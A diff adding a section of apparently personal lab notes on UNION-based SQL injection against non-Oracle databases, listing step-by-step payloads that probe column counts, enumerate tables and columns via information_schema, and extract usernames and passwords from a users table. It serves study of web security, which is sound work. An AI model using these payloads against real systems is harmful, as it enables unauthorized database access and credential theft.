@@ -49,7 +49,24 @@
 
 
 
+## non-Oracle databases
 
+- __'+UNION+SELECT+NULL,NULL--__
+
+- __Checking if any of them holds string data__
+  - __`'+UNION+SELECT+'abc','def'--`__
+  - __If the abc and def reflect in the page means the two columns hold string__
+
+
+- __Getting the table name__
+  - __`'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`__
+
+- __Extracting the column names from a table(users_kwechv)__
+  - __`'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_kwechv'--`__
+
+
+- __Extracting the data from the two columns (1.username_ygmrlj, 2.password_jiuphc) from table(users_kwechv)__
+  - __`'+UNION+SELECT+username_ygmrlj,+password_jiuphc+FROM+users_kwechv--`__
 
 
 
